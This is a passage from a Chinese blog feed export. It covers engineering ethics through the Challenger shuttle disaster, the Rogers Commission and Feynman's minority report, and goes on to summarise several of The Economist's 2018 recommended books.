<th>糟糕的设计</th>
</tr>
</thead>
<tbody>
<tr>
<td>符合所有技术需求</td>
<td>只符合一部分技术需求</td>
</tr>
<tr>
<td>一直工作</td>
<td>起初工作，但一段时间后停止工作</td>
</tr>
<tr>
<td>符合成本需求</td>
<td>超过了预计的成本</td>
</tr>
<tr>
<td>需要很少或不需要维护</td>
<td>需要频繁维护</td>
</tr>
<tr>
<td>安全</td>
<td>对用户造成危害</td>
</tr>
<tr>
<td>不存在伦理困境</td>
<td>产生道德问题</td>
</tr>
<tr>
<td></td>
</tr>
</tbody>
</table>
</div>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h2 id="参考书"><a href="#参考书" class="headerlink" title="参考书"></a>参考书</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title>国之重器，在人不在宝|挑战者号航天飞机事故调查</title>
    <url>/2019/02/04/Engineering-Ethics/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>挑战者号航天飞机事故调查</li>
<li>理查德·费曼与罗杰斯委员会</li>
<li>工程伦理</li>
</ul>
<span id="more"></span>
<blockquote>
<p>很多工程故障不是单单由技术方面的计算错误引起，而是涉及到设计过程失败、维修出错或管理文化失败。— 故障分析专家亨利·裴特斯基（Henry Petroski）</p>
</blockquote>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>较为人知的工程失败事件，有些是技术问题引起的，有些是伦理问题造成的：</p>
<ul>
<li>福岛第一核电厂事故（2011）</li>
<li>哥伦比亚号航天飞机灾难（2003）</li>
<li>挑战者号航天飞机灾难（1986）</li>
<li>切尔诺贝利核事故（1986）</li>
<li><p>三丰百货大楼倒塌事件（1995）<br>实际建筑和原本蓝图不符、建筑层数被加高、支柱比原来设计幼兼少放钢筋、额外加置大量保暖设施、用不适当方法移动顶楼的冷气水缸加速楼宇结构损毁，业主发觉楼宇结构出问题只作出维修而非疏散也是导致大量死伤的原因。</p>
</li>
<li><p>新世界酒店（联益大厦）坍塌（1986）<br>大厦设计错误（整栋大厦由业主黄康霖委任不合格的绘图员设计, 而且由业主以妻舅名义成立的空壳建筑公司以非公开招标形式取得建造合约）、实际建筑和原本蓝图不符（事实比图则少了3条支柱）、偷工减料（业主为节省成本, 在建筑过程中要求更改混凝土成分）、由非专业人士设计和监工楼宇建筑，业主发觉楼宇结构出问题只作出维修而非疏散也是导致大量死伤的原因。</p>
</li>
<li><p>中华航空611号班机空难（2002）<br>维修损毁机尾的工程人员错误使用比标准面积较小的蒙皮进行维修，及后22年没有维修人员发觉飞机尾部未完全修复，尤其是1995年中华航空才全面禁烟，但机尾有焦油积，说明1995年禁烟至2002年事发的七年间机尾有裂缝问题没有被维修人员发现。</p>
</li>
<li><p>突尼斯国际航空1153号班机事故（2005）<br>维修油标的工程人员错误换上为ATR-42设计而非为ATR-72设计的油标，令油标无法正确显示肇事客机ATR-72的真正油量, 直接导致飞机引擎在驾驶途中途突然熄火。</p>
</li>
</ul>
<h2 id="挑战者号航天飞机灾难"><a href="#挑战者号航天飞机灾难" class="headerlink" title="挑战者号航天飞机灾难"></a>挑战者号航天飞机灾难</h2><p><strong>挑战者号航天飞机灾难</strong> 发生于美国东部时间1986年1月28日上午11时39分：在佛罗里达州上空刚起飞73秒的挑战者号航天飞机于升空过程中突然爆炸，七名宇航员全部遇难。（飞行任务编号：<a href="https://zh.wikipedia.org/wiki/STS-51-L">STS-51-L</a>，美国历史上第25次航天飞机任务，也是挑战者号航天飞机的第10次太空飞行。）</p>
<p>这次事故的媒体报导的覆盖面极广，一项民意调查显示有 85% 的美国人在事故发生后一个小时内就已经听闻这次事件的新闻。七名机组人员中包括一名中学教师<a href="https://zh.wikipedia.org/wiki/%E5%85%8B%E9%87%8C%E6%96%AF%E5%A1%94%C2%B7%E9%BA%A6%E8%80%83%E5%88%A9%E8%8A%99">克里斯塔·麦考利芙（Christa McAuliffe）</a> —— 她从11,000多名申请者中脱颖而出，参加了NASA组织的空间教师项目，按照计划她将在太空授课，因为观看直播的人群中包括全美半数以上的中小学生。</p>
<p>这次灾难性事故导致美国的航天飞机飞行计划被冻结了长达32个月之久。</p>
<h4 id="事故调查《罗杰斯报告》"><a href="#事故调查《罗杰斯报告》" class="headerlink" title="事故调查《罗杰斯报告》"></a>事故调查《罗杰斯报告》</h4><p>美国总统罗纳德·里根下令组织一个特别委员会——航天飞机挑战者号事故总统调查委员会(以其主席的名字,常称作 <strong>罗杰斯委员会</strong>)负责此次事故的调查工作。</p>
<p>罗杰斯委员会工作了几个月后于1986年6月9日发表了一份长达225页的研究报告（<a href="https://history.nasa.gov/rogersrep/genindex.htm">《罗杰斯报告·正文》</a>）。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Rogers_Report_Theme.png" alt=""></p>
<p>调查报告指出挑战者号的意外是由右侧固体火箭助推器尾部一个密封接缝的O型环失效，导致加压的热气和火焰从紧邻的外加燃料舱的封口喷出，造成结构损坏。O型环的失效则归因于设计上的缺陷，密封环没有针对寒冷天气设计，发射当天佛罗里达州异常寒冷（零下2摄氏度），过度冰冷的密封圈会因为太僵硬而不能很好地密封火箭助推器，或者在异常低温条件下变脆、破裂。报告也考虑到了意外的成因。最明显的就是NASA与承包商的疏忽，莫顿·塞奥科公司承认了他们在设计上存在的缺陷。罗杰斯报告的正式结论是“一场肇由历史的事故”。</p>
<blockquote>
<p>在沟通上的失败……发射决策是创建在不完善与时常误导的信息上的。冲突存在于…..一个允许航天飞机管理层忽略掉潜在的飞行安全问题的NASA管理结构之间。</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Rogers-Member-Snap.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Rogers-Members.png" alt=""></p>
<h4 id="少数派调查报告"><a href="#少数派调查报告" class="headerlink" title="少数派调查报告"></a>少数派调查报告</h4><p>调查委员会最著名的成员之一是理论物理学家理查德·费曼。他用他自己的方法而不是按照委员会的日程表进行调查，这种行事风格使得他与官僚、保守的委员会主席罗杰斯发生了争执。</p>
<blockquote>
<p>Feynman is becoming a real pain. — William P. Rogers</p>
</blockquote>
<p>费曼在调查过程中直接访问了大量一线工程师，他发现 NASA 管理层对于风险概率的理解与一下工程师有完全不同：工程师坦言，在这次太空计划中，宣传起了主导作用，审慎和安全则退居其次。</p>
<blockquote>
<p>官方管理层声称，他们相信飞行计划失败的概率是这个数据的1/1000。他们这么做的一个原因可能是：让政府看到NASA计划周全，还能按时把事情干得很漂亮，以确保政府给予资金支持。另一个原因可能是他们真的相信失败率极低——这说明他们和一线工程师的沟通严重缺乏，甚至到了匪夷所思的地步。</p>
</blockquote>
<p>在综合考虑后，项目成员单位的一线工程师给出的失败概率估计值为：</p>
<ul>
<li>火箭发动机制造商洛克达因（Rocketdyne）： 1/10000</li>
<li>马歇尔太空飞行中心:1/300</li>
<li>NASA聘请的独立工程顾问：1/100 或 1/50</li>
</ul>
<p>作为项目管理者 NASA 对外宣称的失败概率只有 1/100000。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Rogers-%E8%B4%A8%E8%AF%A2.png" alt="调查听证会：费曼正在质询"></p>
<p>除了针对固体燃料火箭展开调查，费曼也对航空电子系统（包括硬件、软件）进行了深入分析：</p>
<blockquote>
<p>现在总结一下，计算机软件检测体系及其检测的仔细程度确实达到了最高水准。</p>
<p>这里并没有出现这种情况:一边降低标准一边自欺欺人一一对于固体火箭助推器或航天飞机主发动机的安全体系来说，这种情况很明显。确实，管理层最近已经提议要减少这样复杂、耗资又如此巨大的测试——他们认为， 在航天飞机发展业已成熟的现阶段，做这些测试是没有必要的。我们必须抵制这些建议，因为持这种看法的人，他们没有认识到微妙的相互影响，整个项目的某一部分即便一个很细微的变化导致的错误也会影响到项目的其他组成部分。</p>
<p>飞船的使用者一直在不断地提各种修改要求:要么提出新的任务，要么提出新的要求和修改意见。而按照他们的要求进行修改，代价很昂贵，因为需要做全面的测试。要省钱，合理的办法是尽可能减少变动，而不是降低每一次改动后 (必须要做的)测试的水准。</p>
</blockquote>
<p>最重要的是，费曼深刻揭露了 NASA 管理文化中的官僚习气。</p>
<p>根据调查，费曼得出结论认为 NASA 管理层对科学的理解有严重缺陷，内部缺乏沟通、对于危险的认识严重歪曲。与费曼不同，调查委员会的大部分成员虽然对美国宇航局提出了批评意见，但是同时明确肯定了挑战者号灾难应该由 NASA 内部解决，不需要暂停其运营或减少财政资金投入。费曼认为，委员会的结论歪曲了他们的调查结果，他无法良心地建议像NASA这样一个存在严重缺陷的组织应该在没有停止运营和重大改革的情况下继续下去。</p>
<p>起初，费曼的调查结论并不被委员会接受。费曼多次威胁要从报告中删除他的名字，并且强烈要求在报告中包括他对航天飞机可靠性的个人观察。最后，费曼的少数派报告才被包括在正式调查报告的附录F中公开。</p>
<p>费曼总结道：</p>
<blockquote>
<p>NASA的管理层都夸大了其产品的可靠性，达到了幻想的程度。</p>
<p>在签订合同、估算成本和评估项目难度等环节，他们也一定要秉承实事求是的态度。他们提出的飞行计划的时间安排一定要合理和切合实际，实施过程中也不至于为了赶期限导致状况百出。<strong>如果他们一一照做了，却得不到政府的支持，那就随他去吧</strong>。</p>
<p>对于一项成功的技术来说，<strong>尊重现实一定要凌驾于公共关系之上</strong>，因为你不能愚弄自然。</p>
</blockquote>
<p>2003年2月1日，哥伦比亚号航天飞机执行STS-107任务发生事故，机上7名宇航员全部遇难。根据事后的调查报告，哥伦比亚号在轨道上时，一些NASA工程师怀疑左翼已经受损，但是管理人员限制了进一步调查。</p>
<p>所谓 <strong>国之重器，在人不在宝</strong> 。</p>
<h4 id="罗杰斯委员会"><a href="#罗杰斯委员会" class="headerlink" title="罗杰斯委员会"></a>罗杰斯委员会</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/rogersv2.png" alt=""></p>
<p>罗杰斯委员会由前国务卿威廉·罗杰斯领衔，传奇航天员阿姆斯特朗任副主席，成员包括宇航员、律师、军方代表和工程技术专家：</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/William_P._Rogers">威廉·罗杰斯,William P. Rogers</a>：调查委员会主席。前美国国务卿（尼克松任内）、前司法部长（艾森豪威尔任内），时年73岁。二战时作为海军中尉服役于无畏号航空母舰，战后为纽约市律师事务所合伙人、参议院法律顾问, 在最高法院“纽约时报公司诉沙利文案”中也担任了重要角色。</li>
<li><a href="https://en.wikipedia.org/wiki/Neil_Armstrong">尼尔·阿姆斯特朗,Neil A. Armstrong</a>：调查委员会副主席。首位登月者，退役航天员，时年56岁。1971年8月从航空航天局辞职后加入辛辛纳提大学（University of Cincinnati）工程系担任教授。退休后非常低调，婉拒多个政党邀请从政、非常审慎选择代言企业。他在多个大学（包括母校普渡大学）中选择规模较小的辛辛那提大学的主要是因为不想引起同事的反感；他不想因为自己学位不高而直接担任教授让其他人不满。</li>
<li><a href="https://en.wikipedia.org/wiki/Alton_G._Keel_Jr.">奥尔顿·基尔,Alton Keel</a>:调查委员会执行秘书。工程师，外交官和商人。弗吉尼亚大学航空航天工程博士。早年从事海军武器研发管理，曾任空军助理部长（研究，开发和后勤）（1981-82）和管理和预算办公室副主任（1982-86）。调查结束之后，基尔就任美国驻北约常驻代表，于2007年担任私人投资银行集团Atlantic Partners LLC的总裁兼董事总经理。</li>
<li><a href="https://en.wikipedia.org/wiki/David_Campion_Acheson">大卫·艾奇逊,David Campion Acheson</a>：执业律师。曾任美国原子能委员会律师/哥伦比亚特区检察官/财政部长特别助理,前国务卿迪恩·艾奇逊的儿子，时年65岁。</li>
<li><a href="https://www.af.mil/About-Us/Biographies/Display/Article/106524/general-donald-j-kutyna/">唐纳德·秋提那,Donald J. Kutyna</a>：空军将领，美军太空系统指挥、控制和通信主管。后任北美防空司令部司令、美军太空司令部司令、四星上将退役。</li>
<li><a href="https://www.legacy.com/obituaries/fredericknewspost/obituary.aspx?n=robert-b-hotz&amp;pid=168455031">罗伯特·霍茨,Robert B. Hotz</a>：《航空周刊》编辑（ Aviation Week And Space Technology ）</li>
<li><a href="https://en.wikipedia.org/wiki/Sally_Ride">莎莉·莱德,Sally K. Ride</a>：美国第一位女航天员，时年35岁。后任加利福尼亚大学圣迭戈分校物理学教授，也是第一个公开承认是同性恋的宇航员。</li>
<li><a href="https://en.wikipedia.org/wiki/Chuck_Yeager">查克·耶格尔,Charles E. Yeager</a>：空军退役准将，美国空军的重要偶像人物，二战英雄、王牌飞行员&amp;NASA试飞员。高中学历，从未上大学，时年63岁。</li>
<li><a href="https://en.wikipedia.org/wiki/Arthur_B._C._Walker_Jr.">小亚瑟·沃克,Arthur BC Walker Jr.</a>:伊利诺伊大学天体物理博士，光学先驱,曾设计制造太阳望远镜，早年曾任美国空军少尉在武器实验室工作。黑人物理学家社区领袖，莎莉·莱德是其在斯坦福大学的第一个研究生。</li>
<li><a href="https://en.wikipedia.org/wiki/Eugene_E._Covert">尤金·科弗特,Eugene E. Covert</a>：航空专家。麻省理工博士，美国空军首席科学家。参与建造第一个实用的风洞磁悬浮系统，1981年获得NASA公共服务奖，时年60岁。</li>
<li><a href="https://en.wikipedia.org/wiki/Joe_Sutter">约瑟夫·萨特,Joseph F. Sutter</a>：波音公司工程师，波音747之父, 时年65岁。</li>
<li><a href="https://www.nytimes.com/2013/10/03/us/albert-d-wheelon-architect-of-aerial-spying-dies-at-84.html">阿尔伯特·惠尔伦,Albert D. Wheelon</a>：时年57岁、任休斯飞机公司(Hughes)执行副总裁。Wheelon 博士于1962年加入中央情报局，直到1966年担任科学和技术副主任。美国国家工程院院士，IEEE 和 AIAA 会士。</li>
<li><a href="https://www.nap.edu/read/13338/chapter/51#279">罗伯特·拉梅尔,Robert W. Rummel</a>：航空航天工程师，时年71岁（serving on the operations subpanel. I headed the design panel for the commission）。曾在洛克希德飞机公司工作，1943年加入环球航空（Trans World Airlines，TWA）并于1969年被任命为技术开发副总裁。</li>
<li><a href="https://riboseyim.github.io/2018/12/31/Science-Feynman">理查德·费曼,Richard P. Feynman</a>：物理学家</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Rogers-Member-Air.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Rogers-Member-Air-F.png" alt="唐纳德·秋提那,Donald J. Kutyna 评价费曼"></p>
<h2 id="资料卡"><a href="#资料卡" class="headerlink" title="资料卡"></a>资料卡</h2><ul>
<li>Hughes 是一家拥有80,000名员工的高科技公司，建造了大量军事和科学卫星，还生产了世界上50％以上的商业通信卫星。罗杰斯委员会成员罗伯特·拉梅尔在环球航空工作期间，同时担任休斯飞机公司航空事务顾问。</li>
</ul>
<h4 id="休斯飞机公司（Hughes-Aircraft）"><a href="#休斯飞机公司（Hughes-Aircraft）" class="headerlink" title="休斯飞机公司（Hughes Aircraft）"></a>休斯飞机公司（Hughes Aircraft）</h4><p>休斯飞机公司（Hughes Aircraft）曾是美国一家主要的防务和航天公司。由<a href="https://zh.wikipedia.org/wiki/%E9%9C%8D%E5%8D%8E%E5%BE%B7%C2%B7%E4%BC%91%E6%96%AF">霍华德·休斯 Howard Robard Hughes, Jr.</a> 在1932年创建。</p>
<p><strong>休斯飞机公司是美国空军的主要导弹供应商之一</strong>，著名产品包括AIM-4、AIM-120（雷达引导中程空对空导弹）等。休斯飞机公司同时是美军重要的直升机供应商，其最著名的产品为H-17、O/AH-6、AH-64阿帕奇武装直升机（1996年并入波音公司）。</p>
<p>1985年休斯飞机公司被通用汽车以50亿美元收购，和其名下的Delco电气及休斯网络系统整合为休斯电子。在随后的约二十年间，通用汽车将原休斯名下的产业逐步出售。</p>
<h4 id="环球航空（Trans-World-Airlines，TWA）"><a href="#环球航空（Trans-World-Airlines，TWA）" class="headerlink" title="环球航空（Trans World Airlines，TWA）"></a>环球航空（Trans World Airlines，TWA）</h4><p>TWA 为美国知名航空公司，总部设于密苏里州的圣路易斯。T&amp;WA在四十年代和五十年代由 <a href="https://zh.wikipedia.org/wiki/%E9%9C%8D%E5%8D%8E%E5%BE%B7%C2%B7%E4%BC%91%E6%96%AF">霍华德·休斯 Howard Robard Hughes, Jr.</a> 掌控，在二战后一直与泛美航空瓜分美国国际航线，并且在跨大西洋航线竞争中处于领先地位。在1988年的夏季，环球航空第一次也是唯一一次，服务超过50%的旅客往返大西洋两岸。</p>
<ul>
<li>1992年TWA第一次破产（空运管制法案的废除大大冲击环航）</li>
<li>1995年TWA第二次破产</li>
<li>1996年7月17日，环航一架波音747（机队编号N93119）在大西洋上空爆炸，机上230人全数遇难。</li>
<li>2001年被美国航空并购并结业</li>
</ul>
<h4 id="波音公司（The-Boeing-Company）"><a href="#波音公司（The-Boeing-Company）" class="headerlink" title="波音公司（The Boeing Company）"></a>波音公司（The Boeing Company）</h4><p>波音公司是世界最大的航天航空器制造商，同时也是全球第二大国防承包商，军售武器量仅仅次于洛克希德·马丁。2014年，波音公司国防部门销售总额达到290亿美元，占波音公司总收入的32%-35%左右。</p>
<h4 id="洛克达因公司（Rocketdyne）"><a href="#洛克达因公司（Rocketdyne）" class="headerlink" title="洛克达因公司（Rocketdyne）"></a>洛克达因公司（Rocketdyne）</h4><p><a href="https://zh.wikipedia.org/wiki/%E6%B4%9B%E5%85%8B%E8%BE%BE%E5%9B%A0%E5%85%AC%E5%8F%B8">普莱特和惠特尼洛克达因公司 Pratt &amp; Whitney Rocketdyne, Inc.</a>是美国的一家主要从事液体燃料火箭发动机设计研发的公司，总部位于加利福尼亚州卡诺伽园。</p>
<h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2018/12/31/Science-Feynman/">人物：理查德·费曼</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://en.wikipedia.org/wiki/Rogers_Commission_Report">Rogers Commission Report</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%93%A5%E4%BC%A6%E6%AF%94%E4%BA%9A%E5%8F%B7%E8%88%AA%E5%A4%A9%E9%A3%9E%E6%9C%BA%E7%81%BE%E9%9A%BE">哥伦比亚号航天飞机灾难</a></li>
<li><a href="https://mp.weixin.qq.com/s/ZHKlrxrWTzfZOM0n6KaJiA">加班越狠，出成绩就越多吗？在NASA，这叫做Go Fever |原创： 余晟  余晟以为</a><br>长期加班就会导致工作重心的变化，关注的不是最终目的的完成，而只是程序性地完成每天的工作量。但是，高科技项目往往需要去发现并解决各种事先想不到的问题，而这恰恰是程序性工作的空白——“阿波罗1号”的悲剧就是最好注解。</li>
<li><a href="https://mp.weixin.qq.com/s/jTTQqH0Q77ihTZ8_YjjyYA">【深度】航天项目研制风险管理模型 | 北京宇航系统工程研究所</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>Policy</tag>
      </tags>
  </entry>
  <entry>
    <title>The Economist 2018年度推荐书单</title>
    <url>/2018/12/08/Economist-Books-Year-2018/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li><a href="https://riboseyim.github.io/2018/12/08/Economist-Books-Year-2018/" target="_blank" rel="noopener">The Economist:Books of the Year 2018</a></li>
<li><a href="https://riboseyim.github.io/2018/01/30/Economist-Books-Year-2017/" target="_blank" rel="noopener">The Economist:Books of the Year 2017</a></li>
<li><a href="https://riboseyim.github.io/2016/12/09/Economist-Books-Year-2016/" target="_blank" rel="noopener">The Economist:Books of the Year 2016</a></li>
</ul>
<a id="more"></a>
<ul>
<li><a href="https://www.economist.com/books-and-arts/2018/12/01/the-economists-books-of-the-year" target="_blank" rel="noopener">原文链接 The Economist’s books of the year</a></li>
</ul>
<blockquote>
<p>They are about corruption, blood, slavery, survivalism, espionage and a drifting second-world-war veteran.</p>
</blockquote>
<h2 id="重点推荐"><a href="#重点推荐" class="headerlink" title="重点推荐"></a>重点推荐</h2><h2 id="政策类"><a href="#政策类" class="headerlink" title="政策类"></a>政策类</h2><h4 id="Moneyland-Why-Thieves-And-Crooks-Now-Rule-The-World-And-How-To-Take-It-Back"><a href="#Moneyland-Why-Thieves-And-Crooks-Now-Rule-The-World-And-How-To-Take-It-Back" class="headerlink" title="Moneyland:Why Thieves And Crooks Now Rule The World And How To Take It Back"></a>Moneyland:Why Thieves And Crooks Now Rule The World And How To Take It Back</h4><ul>
<li>作者：奥利弗·布洛（Oliver Bullough）</li>
<li>售价：298 pages; £20 | St Martin’s Press in May $28.99 | ￥196（精装）</li>
<li><p>链接：<a href="https://www.amazon.cn/dp/125020870X" target="_blank" rel="noopener">https://www.amazon.cn/dp/125020870X</a></p>
</li>
<li><p>内容概要</p>
</li>
</ul>
<p>Moneyland是作者布洛虚构的一个词汇，指的是一个让全世界富豪权贵们洗钱的地方。</p>
<p>富人怎样把超级财富藏到税务局不找到的地方？作者以苏联遗贵为主线，收集了律师、会计、金融诈骗集团的多方故事，勾勒出财产转移的世界地图。在这本书里，布洛讲讲述他在 Moneyland 的发现 —— 这是由一群无法无天，无国籍的超级富豪组成的秘密国家。你将会在书中看到欧洲和美国的机构如何为这些洗钱的人服务，从而破坏了西方世界稳定的根源。你会了解到整个世界为这种无秩序的商业活动付出的代价，还有有志之士是如何反击他们的。</p>
<ul>
<li>相关作品</li>
</ul>
<p>奥利弗·布洛（Oliver Bullough）著有两部关于俄罗斯历史和政治的非虚构作品，《俄罗斯的最后一人》（THE LAST MAN IN RUSSIA）以及《声名鹊起》（LET OUR FAME BE GREAT），并凭此入围英国奥威尔奖（Orwell Prize）短名单，获得美国科尼利厄斯·瑞安奖（Cornelius Ryan）。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Economist_2018_MoneyLand.jpg-1024_800_nologo" alt></p>
<h4 id="Shadows-of-Empire"><a href="#Shadows-of-Empire" class="headerlink" title="Shadows of Empire"></a>Shadows of Empire</h4><ul>
<li>作者：Michael Kenny and Nick Pearce</li>
<li>售价：200 pages; $19.95 and £14.99</li>
<li>链接：<a href="https://www.amazon.co.uk/Shadows-Empire-Anglosphere-British-Politics/dp/1509516611" target="_blank" rel="noopener">https://www.amazon.co.uk/Shadows-Empire-Anglosphere-British-Politics/dp/1509516611</a></li>
<li>内容概要</li>
</ul>
<p>基于对英国，美国，加拿大，澳大利亚和新西兰英语国家之间特殊联系的信念，被支持者称为“Anglosphere”，批评者称之为“Empire 2.0”。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Economist_2018_Anglosphere_Map.png-1024_800_nologo" alt></p>
<p>“Anglosphere”（中文常译为：英语圈） 并不是一个常用术语。首先是由美国科幻作家尼尔·斯蒂芬森在他的《钻石年代》（1995年出版）中创造出的，最初并没有详细定义。 《韦氏字典》将其定义为“这个世界上英语语言及文化主宰的国家”（the countries of the world in which the English language and cultural values predominate）。</p>
<p>在这本书中，迈克尔·肯尼（Michael Kenny）和尼克·皮尔斯（Nick Pearce）将这一想法的历史渊源追溯到大英帝国在维多利亚时代晚期。他们展示了英国政治人物，从丘吉尔到撒切尔，如何不断改写它以及如何通过一群右翼政治家，历史学家和小册子来恢复它。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Economist_2018_Queen_Elizabeth_1956.jpg-1024_800_nologo" alt></p>
<ul>
<li>相关作品</li>
</ul>
<p><a href="https://www.polis.cam.ac.uk/Staff_and_Students/professor-micheal-kenny" target="_blank" rel="noopener">Michael Kenny</a> 剑桥大学公共政策教授。苏格兰议会专家小组成员，就英国退欧的宪法影响提供政策建议。</p>
<p><a href="https://www.bath.ac.uk/profiles/director-of-the-institute-for-policy-research-ipr-and-professor-of-public-policy-nick-pearce/" target="_blank" rel="noopener">Nick Pearce</a> 英国巴斯大学（University of Bath）公共政策教授。政策研究所（The Institute for Policy Research,IPR）主任，领导政策研究所（IPR）的研究，教学，政策计划和公众参与活动。</p>
<h2 id="历史类"><a href="#历史类" class="headerlink" title="历史类"></a>历史类</h2><h4 id="A-History-of-America-in-100-Maps"><a href="#A-History-of-America-in-100-Maps" class="headerlink" title="A History of America in 100 Maps"></a>A History of America in 100 Maps</h4><ul>
<li>作者：Susan Schulten</li>
<li>售价：University of Chicago Press; 256 pages; $35. British Library; £30 | ￥259</li>
<li>链接：<a href="https://www.amazon.cn/dp/022645861X" target="_blank" rel="noopener">https://www.amazon.cn/dp/022645861X</a></li>
<li>内容概要</li>
</ul>
<p>在本书中，Susan Schulten 使用地图探索了美国五个世纪的历史，从大航海时代到数字时代。</p>
<p>全书 100 幅全彩色地图主要来自英国图书馆档案，并按照时间顺序编成九个章节。其中一些地图是由成熟的制图员制作的，而另一些是由不知名的人制作的，例如切诺基部落领导人，前线士兵和第一代正式接受教育的女孩。有些是政治和外交的工具，有些则是社会改革甚至广告和娱乐的工具。作者发掘了每一幅地图的特征，并就其更大的历史意义进行讨论，从而传达对过去的全新视角。</p>
<p>本书提供富有想象力和视觉吸引力的美国历史之旅，向读者展示了一种驾驭自己世界的新方式。</p>
<ul>
<li>相关作品</li>
</ul>
<p><a href="https://en.wikipedia.org/wiki/Susan_Schulten" target="_blank" rel="noopener">Susan Schulten</a> 美国丹佛大学教授，历史学家。本科毕业于加州大学伯克利分校，并从宾夕法尼亚大学获得博士学位。</p>
<h4 id="The-China-Mission-George-Marshall’s-Unfinished-War-1945-1947"><a href="#The-China-Mission-George-Marshall’s-Unfinished-War-1945-1947" class="headerlink" title="The China Mission: George Marshall’s Unfinished War, 1945-1947"></a>The China Mission: George Marshall’s Unfinished War, 1945-1947</h4><ul>
<li>作者：Daniel Kurtz-Phelan</li>
<li>售价：W.W. Norton &amp; Company; 496 pages; $28.95</li>
<li>链接：<a href="https://www.amazon.com/China-Mission-Marshalls-Unfinished-1945-1947/dp/0393240959" target="_blank" rel="noopener">https://www.amazon.com/China-Mission-Marshalls-Unfinished-1945-1947/dp/0393240959</a></li>
<li>内容概要</li>
</ul>
<p>乔治·卡特利特·马歇尔(George Catlett Marshall)堪称美国历史上最伟大的军人政治家之一，他的成就可比德怀特·艾森豪威尔(Dwight Eisenhower)，或许还堪与乔治·华盛顿(George Washington)本人相提并论。 1939年，他被富兰克林·罗斯福(Franklin Roosevelt)任命为参谋长，负责将美国陆军从一支弱小、萎靡的部队，转变为一座强大的战争机器。他被哈利·杜鲁门(Harry Truman)誉为「二战中最伟大的人物」，被温斯顿·邱吉尔(Winston Churchill)誉为真正的「胜利建筑师」，在塑造战后不稳定的和平之中，他也发挥了重要作用。</p>
<p>但是，在马歇尔的众多成功之中，夹杂着一次重大失败。他在退伍后回到了位于维吉尼亚州利斯堡的家中，但是没休息几天就肩负特殊使命飞往中国。然而，这一使命以失败为终，中国陷入了内战。这本书即讲述了一位战士和政治家的经历，同时提醒了现代读者：美国的影响力有其边界。</p>
<ul>
<li>相关作品</li>
</ul>
<p><a href="https://www.cfr.org/expert/daniel-kurtz-phelan" target="_blank" rel="noopener">Daniel Kurtz-Phelan</a> 《外交》（Foreign Affairs）杂志执行编辑(2017年10月~)。曾担任美国国务院政策规划团队（The Policy Planning Staff）成员。</p>
<p>《外交》（Foreign Affairs），由美国著名的智库美国外交关系协会主办，为美国国际事务及外交政策研究领域最权威、影响力最大的学术杂志之一。杂志于1922年开始出版。1947年7月，《外交》刊登了乔治·凯南的文章X Article，使外界首次了解到遏制战略思想。</p>
<p>The Policy Planning Staff，内部缩写 S/P，是美国国务院的主要战略部门。有时也称为政策规划委员会/办公室。它由着名的外交官乔治·凯南（George F. Kennan）于1947年根据国务卿乔治·马歇尔（George Marshall）的要求创建，“作为国务卿独立政策分析和建议的来源”。该委员会的的第一个任务是设计马歇尔计划。</p>
<h2 id="商业经济类"><a href="#商业经济类" class="headerlink" title="商业经济类"></a>商业经济类</h2><h4 id="We-the-Corporations-How-American-Businesses-Won-Their-Civil-Rights"><a href="#We-the-Corporations-How-American-Businesses-Won-Their-Civil-Rights" class="headerlink" title="We the Corporations: How American Businesses Won Their Civil Rights"></a>We the Corporations: How American Businesses Won Their Civil Rights</h4><ul>
<li>作者：亚当·温克勒（Adam Winkler）</li>
<li>售价：Liveright; 496 pages; $28.95</li>
<li>链接：<a href="https://www.amazon.com/We-Corporations-American-Businesses-Rights/dp/0871407124" target="_blank" rel="noopener">https://www.amazon.com/We-Corporations-American-Businesses-Rights/dp/0871407124</a></li>
<li>内容概要</li>
</ul>
<p>本书记载了美国历史上最成功但最不为人知的“民权运动”的故事。</p>
<p>​​​亚当·温克勒（Adam Winkler）从殖民时代开始他的叙述，重点分析了美国最高法院历史上最具争议的裁决之一：2010年对联合公民（Citizen United）诉联邦选举委员会一案的裁决，揭示了公司对民主和宪法本身形成的深远影响。关于公司权利的第一个最高法院案件开始于 1809 年，相较于关于非裔美国人或妇女权利的第一个可比案例还要早半个世纪。从那以后，企业开展了一场持久而卓有成效的运动，以赢得越来越多的个人权利。</p>
<p>企业是与个人具有同等意义的“公民”，还是一种具有与个体不同权利和责任的实体？一系列法庭胜利让美国企业逐步争取到了越来越多的“公民权”，但企业人格化背后还有更多复杂的政治问题。本书为所有对美国历史、法律和政治感兴趣的人带来了富有启发的阅读。</p>
<p>本书同时入围2018年非小说类国家图书奖、纽约时报年度书籍、华盛顿邮报年度书籍、经济学人年度最佳书籍。</p>
<ul>
<li>相关作品</li>
</ul>
